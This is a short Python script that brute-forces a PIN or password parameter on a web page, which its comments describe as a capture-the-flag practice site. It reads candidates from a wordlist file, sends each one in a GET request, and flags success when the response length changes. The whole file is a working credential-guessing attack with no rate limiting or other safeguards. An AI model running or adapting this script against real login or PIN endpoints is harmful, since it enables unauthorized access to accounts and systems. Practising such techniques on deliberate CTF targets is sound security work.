import requests

URL = "https://cherryblog.in/create_challenge/challenges/cash-bank/flag.php?"#a ctf website used for practing web app penetration
my_file = open("pin41.txt","r")#file path containing lists of passwords

for password in my_file:
        PARAMS = {'flag':password} #flag is the paramter name
        r = requests.get(url=URL, params=PARAMS)
        if len(r.text) != 52: #checking to see if response is not equal to 52
                print("[+] Password found: "+password+" ")
                print(r.content)
                break
        else:
                print("[!] Invalid password: "+password+" ")  
        
